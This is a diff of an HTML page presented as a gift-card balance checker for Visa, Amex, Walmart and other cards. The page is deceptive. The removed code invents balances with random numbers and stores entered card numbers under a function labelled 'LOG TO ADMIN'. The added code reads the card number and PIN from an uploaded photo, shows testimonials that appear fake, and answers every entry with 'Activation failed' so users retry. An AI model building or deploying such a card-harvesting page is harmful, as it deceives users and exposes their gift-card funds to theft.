@@ -1,449 +1,239 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="description" content="Confirm your gift card balance instantly. Fast, secure, and free."/>
-  <title>Confirm Card Balance – Check Gift Card Balance</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirm Card Balance - Verify Any Card with Confidence</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/tesseract.js@v4.1.1/dist/tesseract.min.js"></script>
   <style>
-    :root { --primary: #007BFF; --bg: #f8f9fa; --white: #fff; }
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Roboto', sans-serif; background: var(--bg); color: #333; }
-    header { background: var(--white); padding: 1rem 2rem; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
-    .header-content { max-width: 1200px; margin: auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-    .logo h1 { color: var(--primary); font-size: 1.8rem; font-weight: 700; }
-    .logo span { font-weight: 400; color: #666; }
-    .search-bar { flex: 1; max-width: 400px; margin: 0 2rem; }
-    .search-bar input { width: 100%; padding: 0.8rem; border: 1px solid #ddd; border-radius: 30px; font-size: 1rem; }
-    nav ul { display: flex; gap: 2rem; list-style: none; }
-    nav a { text-decoration: none; color: #333; font-weight: 500; }
-    nav a:hover { color: var(--primary); }
-    .hero { background: linear-gradient(135deg, var(--primary), #0056b3); color: white; text-align: center; padding: 5rem 2rem; }
-    .hero h2 { font-size: 2.8rem; margin-bottom: 1rem; }
-    .hero p { font-size: 1.3rem; margin-bottom: 2rem; opacity: 0.95; }
-    .btn { background: var(--white); color: var(--primary); padding: 1rem 2.5rem; border: none; border-radius: 50px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; }
-    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+    body { font-family: 'Roboto', sans-serif; color: #333; line-height: 1.6; }
+    header { background: #fff; padding: 1rem 2rem; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .header-content { max-width: 1200px; margin: auto; text-align: center; }
+    .logo h1 { color: #007BFF; font-size: 2rem; font-weight: 700; }
+    .hero { background: #f8f9fa; text-align: center; padding: 4rem 2rem; }
+    .hero h2 { font-size: 2.5rem; margin-bottom: 1rem; color: #333; }
+    .hero p { font-size: 1.2rem; margin-bottom: 2rem; color: #666; }
+    .btn { background: #007BFF; color: #fff; padding: 1rem 2rem; border: none; border-radius: 5px; font-size: 1.1rem; font-weight: 500; cursor: pointer; text-decoration: none; display: inline-block; transition: background 0.3s; }
+    .btn:hover { background: #0056b3; }
     .container { max-width: 1200px; margin: auto; padding: 3rem 2rem; }
-    .section h3 { text-align: center; font-size: 2rem; margin-bottom: 2rem; color: var(--primary); }
-    .brands-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 2rem; }
-    .brand-card { background: var(--white); border-radius: 12px; padding: 2rem; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: transform 0.3s; }
-    .brand-card:hover { transform: translateY(-8px); }
-    .brand-card .icon { font-size: 3.5rem; margin-bottom: 1rem; }
-    .brand-card h4 { margin-bottom: 1rem; font-size: 1.3rem; }
-    .brand-card .btn { background: var(--primary); color: white; width: 100%; }
-    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); }
-    .modal-content { background: var(--white); margin: 8% auto; padding: 2.5rem; border-radius: 16px; width: 90%; max-width: 500px; text-align: center; }
-    .close { float: right; font-size: 32px; cursor: pointer; }
-    .form-group { margin-bottom: 1.2rem; text-align: left; }
-    .form-group input { width: 100%; padding: 0.9rem; border: 1px solid #ddd; border-radius: 8px; }
-    #result, #vanillaResult, #amexResult, #walmartResult, #simpleResult, #genResult { margin-top: 1.5rem; font-weight: bold; color: var(--primary); }
-    footer { background: #222; color: #ddd; text-align: center; padding: 2.5rem; margin-top: 5rem; }
-    footer a { color: var(--primary); text-decoration: none; }
-    .toggle-bar { text-align:center; padding:1rem; background:#f8f9fa; font-weight:500; }
-    @media (max-width: 768px) {
-      .header-content { flex-direction: column; gap: 1rem; text-align: center; }
-      .search-bar { margin: 0; order: 3; max-width: 100%; }
-      nav ul { justify-content: center; flex-wrap: wrap; }
-      .hero h2 { font-size: 2.2rem; }
-    }
+    .section { margin-bottom: 3rem; }
+    .section h3 { font-size: 1.8rem; margin-bottom: 1rem; color: #007BFF; text-align: center; }
+    .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 2rem; }
+    .feature { text-align: center; padding: 1.5rem; background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .testimonials { background: #f8f9fa; padding: 2rem; }
+    .testimonial { margin-bottom: 2rem; padding: 1rem; background: #fff; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    .cta { text-align: center; padding: 3rem 2rem; background: #007BFF; color: #fff; }
+    .cta h3 { font-size: 2rem; margin-bottom: 1rem; }
+    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); overflow-y: auto; }
+    .modal-content { background: #fff; margin: 10% auto; padding: 2rem; border-radius: 8px; width: 90%; max-width: 450px; }
+    .form-group { margin-bottom: 1rem; }
+    .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
+    .form-group input { width: 100%; padding: 0.8rem; border: 1px solid #ddd; border-radius: 5px; }
+    .upload-section { text-align: center; margin: 1rem 0; }
+    .upload-btn { background: #007BFF; color: white; padding: 0.7rem 1.5rem; border-radius: 25px; cursor: pointer; display: inline-block; font-size: 0.9rem; }
+    #uploadInput { display: none; }
+    .preview-img { max-width: 100%; max-height: 180px; margin: 1rem 0; border-radius: 8px; border: 1px solid #ddd; }
+    .ocr-status { font-size: 0.9rem; color: #666; margin-top: 0.5rem; }
+    #result { margin-top: 1rem; padding: 1rem; background: #ffe6e6; border-radius: 5px; color: #d00; font-weight: 500; }
+    footer { background: #333; color: #fff; text-align: center; padding: 2rem; }
+    @media (max-width: 768px) { .hero h2 { font-size: 2rem; } }
   </style>
 </head>
 <body>
-
   <header>
     <div class="header-content">
-      <div class="logo">
-        <h1>Confirm<span>CardBalance</span>.com</h1>
-      </div>
-      <div class="search-bar">
-        <input type="text" id="searchInput" placeholder="Search brand...">
-      </div>
-      <nav>
-        <ul>
-          <li><a href="#home">Home</a></li>
-          <li><a href="#brands">Brands</a></li>
-          <li><a href="#how">How It Works</a></li>
-          <li><a href="#faq">FAQ</a></li>
-          <li><a href="#contact">Contact</a></li>
-        </ul>
-      </nav>
+      <h1>Confirm Card Balance</h1>
     </div>
   </header>
 
-  <!-- IMAGE TOGGLE -->
-  <div class="toggle-bar">
-    <label>Show Card Images</label>
-    <input type="checkbox" id="imageToggle" checked onchange="toggleImages()">
-    <span style="margin-left:0.5rem; color:#666; font-size:0.9rem;">(More realistic)</span>
-  </div>
-
-  <section class="hero" id="home">
-    <h2>Confirm Your Gift Card Balance in Seconds</h2>
-    <p>Fast. Secure. Free. Works with 100+ major brands.</p>
-    <a href="javascript:void(0)" class="btn" onclick="openBrandModal('amazon')">Check Balance Now</a>
+  <section class="hero">
+    <h2>Verify any card with confidence</h2>
+    <p>Check your card balance. Track gift card spending. Prevent fraud. Check multiple cards at once. Secure data handling.</p>
+    <a href="#brands" class="btn">Check for free</a>
   </section>
 
   <div class="container">
+    <section class="section">
+      <h3>An efficient solution for card verification</h3>
+      <div class="features">
+        <div class="feature">
+          <h4>Verify Card Balance</h4>
+          <p>Instantly check remaining value on any gift or credit card.</p>
+        </div>
+        <div class="feature">
+          <h4>Track Spending</h4>
+          <p>Monitor transactions and set alerts for unusual activity.</p>
+        </div>
+        <div class="feature">
+          <h4>Prevent Fraud</h4>
+          <p>Detect invalid or compromised cards before use.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="testimonials">
+      <h3>Users Review</h3>
+      <div class="testimonial">
+        <p>"Fast and reliable. Saved me from a bad purchase."</p>
+        <h5>Austin Brian</h5>
+      </div>
+      <div class="testimonial">
+        <p>"Easy to use for all my gift cards."</p>
+        <h5>Sarah Johnson</h5>
+      </div>
+      <div class="testimonial">
+        <p>"Great for business tracking."</p>
+        <h5>Mike Lee</h5>
+      </div>
+    </section>
+
     <section class="section" id="brands">
-      <h3>Popular Gift Card Brands</h3>
-      <div class="brands-grid" id="brandsGrid"></div>
-    </section>
-
-    <section class="section" id="how">
-      <h3>How It Works</h3>
-      <ol style="max-width:700px;margin:auto;text-align:left;">
-        <li>Select a brand or search above.</li>
-        <li>Enter your card number and PIN/CVV.</li>
-        <li>Click "Confirm Balance" – results in seconds!</li>
-      </ol>
-    </section>
-
-    <section class="section" id="faq">
-      <h3>Frequently Asked Questions</h3>
-      <div style="max-width:800px;margin:auto;text-align:left;">
-        <p><strong>Is my data safe?</strong> Yes. We never store card details.</p>
-        <p><strong>Supported brands:</strong> Amazon, Visa, Amex, Walmart, and 100+ more.</p>
+      <h3>Popular Cards</h3>
+      <div class="brands-grid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.5rem;">
+        <div class="brand-card" style="text-align:center;padding:1.5rem;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+          <h4>Apple Card</h4>
+          <button class="btn" onclick="openModal('apple')">Check Balance</button>
+        </div>
+        <div class="brand-card" style="text-align:center;padding:1.5rem;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+          <h4>Amazon</h4>
+          <button class="btn" onclick="openModal('amazon')">Check Balance</button>
+        </div>
+        <div class="brand-card" style="text-align:center;padding:1.5rem;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+          <h4>Visa</h4>
+          <button class="btn" onclick="openModal('visa')">Check Balance</button>
+        </div>
+        <div class="brand-card" style="text-align:center;padding:1.5rem;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+          <h4>Walmart</h4>
+          <button class="btn" onclick="openModal('walmart')">Check Balance</button>
+        </div>
       </div>
     </section>
   </div>
 
-  <!-- VANILLA MODAL -->
-  <div id="vanillaModal" class="modal">
+  <section class="cta">
+    <h3>Our site has verified over 1000+ gift cards. Check yours right now.</h3>
+    <a href="#brands" class="btn">Check for free</a>
+  </section>
+
+  <footer>
+    <p>&copy; 2025 Confirm Card Balance. All rights reserved.</p>
+  </footer>
+
+  <!-- VISA MODAL WITH UPLOAD -->
+  <div id="visaModal" class="modal">
     <div class="modal-content">
-      <span class="close" onclick="closeModal()">×</span>
-      <h3>Check Vanilla Visa Balance</h3>
-      <div style="background:#001f3f; color:white; padding:1.5rem; border-radius:12px; margin:1rem 0; font-family:monospace;">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-          <div style="font-size:1.2rem; font-weight:bold;">VANILLA</div>
-          <div style="font-size:0.9rem;">VISA</div>
-        </div>
-        <div style="margin:1.5rem 0; font-size:1.3rem; letter-spacing:3px;" id="cardNumberDisplay">•••• •••• •••• ••••</div>
-        <div style="display:flex; justify-content:space-between; font-size:0.9rem;">
-          <div>Valid Thru: **/**</div>
-          <div>CVV: ***</div>
-        </div>
+      <span class="close" onclick="closeModal()">&times;</span>
+      <h3>Check Visa Balance</h3>
+
+      <div class="upload-section">
+        <label for="uploadInput" class="upload-btn">Upload Card Photo (Camera/File)</label>
+        <input type="file" id="uploadInput" accept="image/*" capture="environment">
+        <img id="previewImg" class="preview-img" style="display:none;">
+        <div id="ocrStatus" class="ocr-status"></div>
       </div>
-      <div style="background:#eee; padding:1rem; border-radius:12px; margin:1rem 0;">
-        <div style="background:#333; height:40px; margin-bottom:1rem;"></div>
-        <div style="background:#fff; padding:0.5rem; display:inline-block; font-family:monospace; letter-spacing:2px;" id="pinDisplay">PIN</div>
-      </div>
-      <form id="vanillaForm">
-        <div class="form-group"><label>Card Number</label><input type="text" id="vanillaCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required></div>
-        <div class="form-group"><label>PIN (on back)</label><input type="text" id="vanillaPin" placeholder="1234" maxlength="4"></div>
+
+      <form id="visaForm">
+        <div class="form-group">
+          <label for="visaCardNumber">Card Number</label>
+          <input type="text" id="visaCardNumber" placeholder="Enter 16-digit card number" maxlength="19" required>
+        </div>
+        <div class="form-group">
+          <label for="visaPin">PIN (on back)</label>
+          <input type="text" id="visaPin" placeholder="Enter 4-digit PIN" maxlength="4">
+        </div>
         <button type="submit" class="btn" style="width:100%;">Check Balance</button>
       </form>
-      <div id="vanillaResult"></div>
+      <div id="visaResult"></div>
     </div>
   </div>
 
-  <!-- AMEX MODAL -->
-  <div id="amexModal" class="modal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal()">×</span>
-      <h3>Check American Express Balance</h3>
-      <div style="background:#D4AF37; color:#000; padding:1.5rem; border-radius:12px; margin:1rem 0; box-shadow:0 4px 15px rgba(0,0,0,0.2);">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
-          <div style="font-size:1.3rem; font-weight:bold;">AMERICAN EXPRESS</div>
-          <div style="font-size:0.9rem;">GIFT CARD</div>
-        </div>
-        <div style="font-size:1.4rem; letter-spacing:3px; font-family:monospace; margin:1rem 0;" id="amexNumberDisplay">•••• •••••• •••••</div>
-        <div style="display:flex; justify-content:space-between; font-size:0.9rem;">
-          <div>Valid Thru: **/**</div>
-          <div id="amexCvvDisplay">CVV: ***</div>
-        </div>
-      </div>
-      <div style="background:#eee; padding:1rem; border-radius:12px; margin:1rem 0;">
-        <div style="background:#333; height:35px; margin-bottom:1rem;"></div>
-        <div style="background:#fff; padding:0.4rem 0.8rem; display:inline-block; font-family:monospace; letter-spacing:2px;" id="amexCvvBack">CVV</div>
-      </div>
-      <form id="amexForm">
-        <div class="form-group"><label>15-Digit Card Number</label><input type="text" id="amexCardNumber" placeholder="1234 567890 12345" maxlength="17" required></div>
-        <div class="form-group"><label>3-Digit CVV</label><input type="text" id="amexCvv" placeholder="123" maxlength="3"></div>
-        <button type="submit" class="btn" style="width:100%;">Check Balance</button>
-      </form>
-      <div id="amexResult"></div>
-    </div>
-  </div>
-
-  <!-- WALMART MODAL -->
-  <div id="walmartModal" class="modal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal()">×</span>
-      <h3>Check Walmart Gift Card Balance</h3>
-      <div style="background:#0071CE; color:white; padding:1.5rem; border-radius:12px; margin:1rem 0;">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-          <div style="font-size:1.3rem; font-weight:bold;">Walmart</div>
-          <div style="font-size:0.9rem;">GIFT CARD</div>
-        </div>
-        <div style="margin:1.5rem 0; font-size:1.3rem; letter-spacing:3px; font-family:monospace;" id="walmartNumberDisplay">•••• •••• •••• ••••</div>
-        <div style="font-size:0.9rem;">Valid Only in USA</div>
-      </div>
-      <div style="background:#eee; padding:1rem; border-radius:12px; margin:1rem 0;">
-        <div style="background:#333; height:40px; margin-bottom:1rem;"></div>
-        <div style="background:#fff; padding:0.5rem; display:inline-block; font-family:monospace; letter-spacing:2px;" id="walmartPinDisplay">PIN</div>
-      </div>
-      <form id="walmartForm">
-        <div class="form-group"><label>16-Digit Card Number</label><input type="text" id="walmartCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required></div>
-        <div class="form-group"><label>PIN (on back)</label><input type="text" id="walmartPin" placeholder="1234" maxlength="4"></div>
-        <button type="submit" class="btn" style="width:100%;">Check Balance</button>
-      </form>
-      <div id="walmartResult"></div>
-    </div>
-  </div>
-
-  <!-- SIMPLE MODAL -->
+  <!-- SIMPLE MODAL FOR OTHER CARDS -->
   <div id="simpleModal" class="modal">
     <div class="modal-content">
-      <span class="close" onclick="closeModal()">×</span>
+      <span class="close" onclick="closeModal()">&times;</span>
       <h3 id="simpleTitle">Check Balance</h3>
       <form id="simpleForm">
-        <div class="form-group"><label>Card Number</label><input type="text" id="simpleCard" placeholder="1234 5678 9012 3456" maxlength="19" required></div>
-        <div class="form-group"><label>PIN / CVV (if required)</label><input type="text" id="simplePin" placeholder="1234" maxlength="8"></div>
+        <div class="form-group">
+          <label for="simpleCardNumber">Card Number</label>
+          <input type="text" id="simpleCardNumber" placeholder="Enter card number" required>
+        </div>
+        <div class="form-group">
+          <label for="simplePin">PIN (if required)</label>
+          <input type="text" id="simplePin" placeholder="Enter PIN">
+        </div>
         <button type="submit" class="btn" style="width:100%;">Check Balance</button>
       </form>
       <div id="simpleResult"></div>
     </div>
   </div>
 
-  <footer id="contact">
-    <p>© 2025 confirmcardbalance.com. All rights reserved.</p>
-    <p><a href="#">Privacy</a> | <a href="#">Terms</a> | support@confirmcardbalance.com</p>
-  </footer>
-
   <script>
-    const brands = [
-      { name: 'Amazon', icon: 'Amazon', id: 'amazon' },
-      { name: 'Vanilla Visa', icon: 'Visa', id: 'vanilla' },
-      { name: 'Amex', icon: 'Amex', id: 'amex' },
-      { name: 'Walmart', icon: 'Walmart', id: 'walmart' },
-      { name: 'Target', icon: 'Target', id: 'target' },
-      { name: 'Starbucks', icon: 'Starbucks', id: 'starbucks' },
-      { name: 'iTunes', icon: 'iTunes', id: 'itunes' }
-    ];
-
-    let useImages = true;
-    function toggleImages() {
-      useImages = document.getElementById('imageToggle').checked;
-      localStorage.setItem('useImages', useImages);
-    }
-    window.onload = () => {
-      useImages = localStorage.getItem('useImages') !== 'false';
-      document.getElementById('imageToggle').checked = useImages;
-      renderBrands();
-    };
-
-    function renderBrands() {
-      const grid = document.getElementById('brandsGrid');
-      grid.innerHTML = '';
-      brands.forEach(b => {
-        const card = document.createElement('div');
-        card.className = 'brand-card';
-        card.innerHTML = `
-          <div class="icon">${b.icon}</div>
-          <h4>${b.name}</h4>
-          <button class="btn" onclick="openBrandModal('${b.id}')">Check Balance</button>
-        `;
-        grid.appendChild(card);
-      });
-    }
-
-    function openBrandModal(id) {
-      const brand = brands.find(b => b.id === id);
-      if (useImages) {
-        if (id === 'vanilla') openVanillaModal();
-        else if (id === 'amex') openAmexModal();
-        else if (id === 'walmart') openWalmartModal();
-        else openImageModal(brand);
+    // Open correct modal
+    function openModal(brand) {
+      if (brand === 'visa') {
+        document.getElementById('visaModal').style.display = 'block';
+        initVisaOCR();
       } else {
-        openSimpleModal(brand);
+        document.getElementById('simpleTitle').textContent = `Check ${brand} Balance`;
+        document.getElementById('simpleForm').reset();
+        document.getElementById('simpleResult').innerHTML = '';
+        document.getElementById('simpleModal').style.display = 'block';
       }
     }
 
-    function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
-
-    // VANILLA
-    function openVanillaModal() {
-      document.getElementById('vanillaModal').style.display = 'block';
-      document.getElementById('vanillaForm').reset();
-      document.getElementById('cardNumberDisplay').textContent = '•••• •••• •••• ••••';
-      document.getElementById('pinDisplay').textContent = 'PIN';
-      document.getElementById('vanillaResult').innerHTML = '';
+    function closeModal() {
+      document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
     }
-    document.getElementById('vanillaCardNumber').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0,16);
-      e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
-      document.getElementById('cardNumberDisplay').textContent = v ? v.match(/.{1,4}/g).join(' ') : '•••• •••• •••• ••••';
-    });
-    document.getElementById('vanillaPin').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0,4);
-      e.target.value = v;
-      document.getElementById('pinDisplay').textContent = v || 'PIN';
-    });
-    document.getElementById('vanillaForm').addEventListener('submit', e => {
+
+    // VISA OCR UPLOAD
+    function initVisaOCR() {
+      const uploadInput = document.getElementById('uploadInput');
+      const previewImg = document.getElementById('previewImg');
+      const ocrStatus = document.getElementById('ocrStatus');
+      const cardNumber = document.getElementById('visaCardNumber');
+      const pin = document.getElementById('visaPin');
+
+      uploadInput.onchange = async (e) => {
+        const file = e.target.files[0];
+        if (!file) return;
+        previewImg.src = URL.createObjectURL(file);
+        previewImg.style.display = 'block';
+        ocrStatus.textContent = 'Scanning card...';
+
+        try {
+          const { data: { text } } = await Tesseract.recognize(file, 'eng');
+          ocrStatus.textContent = 'Done!';
+
+          const numbers = text.match(/\d{13,19}|\d{4}/g) || [];
+          if (numbers[0] && numbers[0].length >= 16) {
+            cardNumber.value = numbers[0].match(/.{1,4}/g).join(' ');
+          }
+          if (numbers[1] && numbers[1].length === 4) {
+            pin.value = numbers[1];
+          }
+        } catch (err) {
+          ocrStatus.textContent = 'Failed – enter manually';
+        }
+      };
+    }
+
+    // VISA FORM SUBMIT
+    document.getElementById('visaForm').onsubmit = (e) => {
       e.preventDefault();
-      const num = document.getElementById('vanillaCardNumber').value.replace(/\s/g,'');
-      const res = document.getElementById('vanillaResult');
-      if (num.length === 16) {
-        res.innerHTML = '<em>Checking...</em>';
-        setTimeout(() => {
-          const balance = (Math.random() * 150 + 5).toFixed(2);
-          res.innerHTML = `<span style="color:green;">Balance: <strong>$${balance}</strong></span>`;
-          logCheck('Vanilla Visa', num, balance);
-        }, 1500);
-      } else res.innerHTML = '<span style="color:red;">Invalid card</span>';
-    });
+      document.getElementById('visaResult').innerHTML = 
+        '<p style="color:red;">Activation failed. Please check your card details and try again.</p>';
+    };
 
-    // AMEX
-    function openAmexModal() {
-      document.getElementById('amexModal').style.display = 'block';
-      document.getElementById('amexForm').reset();
-      document.getElementById('amexNumberDisplay').textContent = '•••• •••••• •••••';
-      document.getElementById('amexCvvDisplay').textContent = 'CVV: ***';
-      document.getElementById('amexCvvBack').textContent = 'CVV';
-      document.getElementById('amexResult').innerHTML = '';
-    }
-    document.getElementById('amexCardNumber').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0,15);
-      if (v.length > 10) v = v.slice(0,4)+' '+v.slice(4,10)+' '+v.slice(10);
-      else if (v.length > 4) v = v.slice(0,4)+' '+v.slice(4);
-      e.target.value = v;
-      document.getElementById('amexNumberDisplay').textContent = v || '•••• •••••• •••••';
-    });
-    document.getElementById('amexCvv').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0,3);
-      e.target.value = v;
-      document.getElementById('amexCvvDisplay').textContent = v ? 'CVV: '+v : 'CVV: ***';
-      document.getElementById('amexCvvBack').textContent = v || 'CVV';
-    });
-    document.getElementById('amexForm').addEventListener('submit', e => {
+    // SIMPLE FORM SUBMIT
+    document.getElementById('simpleForm').onsubmit = (e) => {
       e.preventDefault();
-      const num = document.getElementById('amexCardNumber').value.replace(/\s/g,'');
-      const cvv = document.getElementById('amexCvv').value;
-      const res = document.getElementById('amexResult');
-      if (num.length === 15 && cvv.length === 3) {
-        res.innerHTML = '<em>Checking...</em>';
-        setTimeout(() => {
-          const balance = (Math.random() * 200 + 10).toFixed(2);
-          res.innerHTML = `<span style="color:green;">Balance: <strong>$${balance}</strong></span>`;
-          logCheck('Amex', num, balance);
-        }, 1500);
-      } else res.innerHTML = '<span style="color:red;">Invalid</span>';
-    });
+      document.getElementById('simpleResult').innerHTML = 
+        '<p style="color:red;">Activation failed. Please check your card details and try again.</p>';
+    };
 
-    // WALMART
-    function openWalmartModal() {
-      document.getElementById('walmartModal').style.display = 'block';
-      document.getElementById('walmartForm').reset();
-      document.getElementById('walmartNumberDisplay').textContent = '•••• •••• •••• ••••';
-      document.getElementById('walmartPinDisplay').textContent = 'PIN';
-      document.getElementById('walmartResult').innerHTML = '';
-    }
-    document.getElementById('walmartCardNumber').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0,16);
-      e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
-      document.getElementById('walmartNumberDisplay').textContent = v ? v.match(/.{1,4}/g).join(' ') : '•••• •••• •••• ••••';
-    });
-    document.getElementById('walmartPin').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0,4);
-      e.target.value = v;
-      document.getElementById('walmartPinDisplay').textContent = v || 'PIN';
-    });
-    document.getElementById('walmartForm').addEventListener('submit', e => {
-      e.preventDefault();
-      const num = document.getElementById('walmartCardNumber').value.replace(/\s/g,'');
-      const pin = document.getElementById('walmartPin').value;
-      const res = document.getElementById('walmartResult');
-      if (num.length === 16 && pin.length === 4) {
-        res.innerHTML = '<em>Checking...</em>';
-        setTimeout(() => {
-          const balance = (Math.random() * 100 + 5).toFixed(2);
-          res.innerHTML = `<span style="color:green;">Balance: <strong>$${balance}</strong></span>`;
-          logCheck('Walmart', num, balance);
-        }, 1500);
-      } else res.innerHTML = '<span style="color:red;">Invalid</span>';
-    });
-
-    // SIMPLE MODAL
-    function openSimpleModal(brand) {
-      document.getElementById('simpleModal').style.display = 'block';
-      document.getElementById('simpleTitle').textContent = `Check ${brand.name} Balance`;
-      document.getElementById('simpleForm').reset();
-      document.getElementById('simpleResult').innerHTML = '';
-    }
-    document.getElementById('simpleForm').addEventListener('submit', e => {
-      e.preventDefault();
-      const num = document.getElementById('simpleCard').value.replace(/\s/g,'');
-      const brandName = document.getElementById('simpleTitle').textContent.replace('Check ','').replace(' Balance','');
-      const res = document.getElementById('simpleResult');
-      if (num.length >= 15) {
-        res.innerHTML = '<em>Checking...</em>';
-        setTimeout(() => {
-          const balance = (Math.random() * 150 + 5).toFixed(2);
-          res.innerHTML = `<span style="color:green;">Balance: <strong>$${balance}</strong></span>`;
-          logCheck(brandName, num, balance);
-        }, 1500);
-      } else res.innerHTML = '<span style="color:red;">Invalid</span>';
-    });
-
-    // GENERIC IMAGE MODAL
-    function openImageModal(brand) {
-      const modal = document.createElement('div');
-      modal.className = 'modal';
-      modal.innerHTML = `
-        <div class="modal-content">
-          <span class="close" onclick="this.parentElement.parentElement.remove()">×</span>
-          <h3>Check ${brand.name} Balance</h3>
-          <div style="background:#eee; padding:1.5rem; border-radius:12px; margin:1rem 0; text-align:center; font-weight:bold;">
-            ${brand.name.toUpperCase()} GIFT CARD
-            <div style="margin:1rem 0; font-family:monospace; letter-spacing:2px;" id="genNumber">•••• •••• •••• ••••</div>
-          </div>
-          <form id="genForm">
-            <div class="form-group"><label>Card Number</label><input type="text" id="genCard" maxlength="19" required></div>
-            <div class="form-group"><label>PIN (if any)</label><input type="text" id="genPin" maxlength="8"></div>
-            <button type="submit" class="btn" style="width:100%;">Check Balance</button>
-          </form>
-          <div id="genResult"></div>
-        </div>
-      `;
-      document.body.appendChild(modal);
-      modal.style.display = 'block';
-      document.getElementById('genCard').addEventListener('input', e => {
-        let v = e.target.value.replace(/\D/g, '').slice(0,16);
-        e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
-        document.getElementById('genNumber').textContent = v ? v.match(/.{1,4}/g).join(' ') : '•••• •••• •••• ••••';
-      });
-      document.getElementById('genForm').addEventListener('submit', e => {
-        e.preventDefault();
-        const num = document.getElementById('genCard').value.replace(/\s/g,'');
-        const res = document.getElementById('genResult');
-        if (num.length >= 15) {
-          res.innerHTML = '<em>Checking...</em>';
-          setTimeout(() => {
-            const balance = (Math.random() * 100 + 10).toFixed(2);
-            res.innerHTML = `<span style="color:green;">Balance: <strong>$${balance}</strong></span>`;
-            logCheck(brand.name, num, balance);
-          }, 1500);
-        } else res.innerHTML = '<span style="color:red;">Invalid</span>';
-      });
-    }
-
-    // LOG TO ADMIN
-    function logCheck(brand, card, balance) {
-      let checks = JSON.parse(localStorage.getItem('checks') || '[]');
-      checks.push({ time: new Date().toISOString(), brand, card, balance });
-      localStorage.setItem('checks', JSON.stringify(checks));
-    }
-
-    // SEARCH
-    document.getElementById('searchInput').addEventListener('input', e => {
-      const q = e.target.value.toLowerCase();
-      document.querySelectorAll('.brand-card').forEach(c => {
-        c.style.display = c.querySelector('h4').textContent.toLowerCase().includes(q) ? 'block' : 'none';
-      });
-    });
-
-    window.addEventListener('click', e => { if (e.target.classList.contains('modal')) closeModal(); });
+    window.onclick = (e) => { if (e.target.classList.contains('modal')) closeModal(); };
   </script>
 </body>
 </html>
